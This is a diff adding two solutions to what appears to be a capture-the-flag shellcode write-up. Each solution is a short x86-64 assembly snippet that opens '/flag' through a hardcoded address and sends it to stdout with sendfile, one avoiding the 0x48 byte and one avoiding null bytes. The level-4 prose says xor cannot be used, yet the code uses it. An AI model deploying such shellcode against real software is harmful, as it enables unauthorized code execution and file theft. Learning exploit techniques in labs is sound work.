@@ -40,3 +40,79 @@ This challenge forbids us from using the H(0x48) byte in our shellcode. Unfortun
 
 
 Thankfully, push and pop can do long-mode operations without using the REX prefix, so we can use them instead of mov. But this removes our ability to do rip relative addressing. Here is the code that should achieve that:
+
+```
+#
+# 1.s
+# Shell
+#
+# Created by Yigit Colakoglu on 09/26/21.
+# Copyright 2021. Yigit Colakoglu. All rights reserved.
+#
+
+.global _start
+
+
+_start:
+  pushq $2
+  popq %rax
+  pushq $0x1337025
+  popq %rdi
+  pushq $0
+  popq %rsi
+  pushq $0
+  popq %rdx
+  syscall
+  
+  pushq %rax
+  popq %rsi
+  pushq $40
+  popq %rax
+  pushq $1
+  popq %rdi
+  pushq $0
+  popq %rdx
+  pushq $1000
+  popq %r10
+  syscall
+
+flag: .asciz "/flag"
+```
+
+#### 4 
+This time, we can't use the 0x00 byte in our shellcode. Thankfully, we don't have to. We can't use `xor` to zero registers and some other tricks. Here is the assembly solution for that:
+
+```assembly
+#
+# 1.s
+# Shell
+#
+# Created by Yigit Colakoglu on 09/26/21.
+# Copyright 2021. Yigit Colakoglu. All rights reserved.
+#
+
+.global _start
+
+
+_start:
+  pushq $2
+  popq %rax
+  pushq $0x1337026
+  popq %rdi
+  xor %rsi, %rsi
+  xor %rdx, %rdx
+  syscall
+  
+  pushq %rax
+  popq %rsi
+  pushq $40
+  popq %rax
+  pushq $1
+  popq %rdi
+  xor %rdx, %rdx
+  xor %r10, %r10
+  movw $1000, %r10w
+  syscall
+
+flag: .ascii "/flag"
+```
